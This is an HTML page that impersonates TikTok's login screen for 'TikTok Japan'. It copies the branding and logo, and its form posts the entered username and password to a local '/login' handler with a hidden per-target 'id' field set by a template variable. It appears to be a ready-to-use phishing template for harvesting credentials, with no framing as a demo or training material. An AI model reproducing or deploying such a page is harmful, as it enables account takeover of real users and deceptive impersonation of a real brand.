<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | TikTok</title>
    <style>
        body {
            margin: 0; padding: 0;
            font-family: 'TikTok-Font', sans-serif;
            background-color: #fff;
            display: flex; justify-content: center; align-items: center;
            height: 100vh;
        }
        .login-box {
            width: 100%; max-width: 440px;
            padding: 40px; text-align: center;
        }
        .logo { width: 120px; margin-bottom: 20px; }
        h2 { font-size: 32px; font-weight: 700; margin-bottom: 8px; }
        .sub-title { color: rgba(22, 24, 35, 0.5); margin-bottom: 32px; }
        
        .input-container { margin-bottom: 12px; text-align: left; }
        .label { font-size: 14px; font-weight: 600; margin-bottom: 4px; display: block; }
        
        input {
            width: 100%; padding: 12px 16px;
            background: rgba(22, 24, 35, 0.06);
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 4px; box-sizing: border-box;
            font-size: 16px; outline: none;
        }
        input:focus { border-color: rgba(22, 24, 35, 0.2); }

        .btn-login {
            width: 100%; padding: 12px;
            background-color: #fe2c55;
            color: white; border: none;
            border-radius: 4px; font-size: 16px;
            font-weight: 700; cursor: pointer;
            margin-top: 20px;
        }
        .footer {
            margin-top: 24px; font-size: 12px;
            color: rgba(22, 24, 35, 0.5);
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok">
        <h2>Log in to TikTok Japan</h2>
        <p class="sub-title">Manage your account, check notifications, and more.</p>

        <form action="/login" method="POST">
            <input type="hidden" name="id" value="{{ idt }}">

            <div class="input-container">
                <span class="label">Phone number, username, or email</span>
                <input type="text" name="username" placeholder="Phone, email or username" required>
            </div>

            <div class="input-container">
                <span class="label">Password</span>
                <input type="password" name="password" placeholder="Password" required>
            </div>

            <button type="submit" class="btn-login">Log in</button>
        </form>

        <div class="footer">
            By continuing, you agree to TikTok's Terms of Service and Privacy Policy.
        </div>
    </div>
</body>
</html>
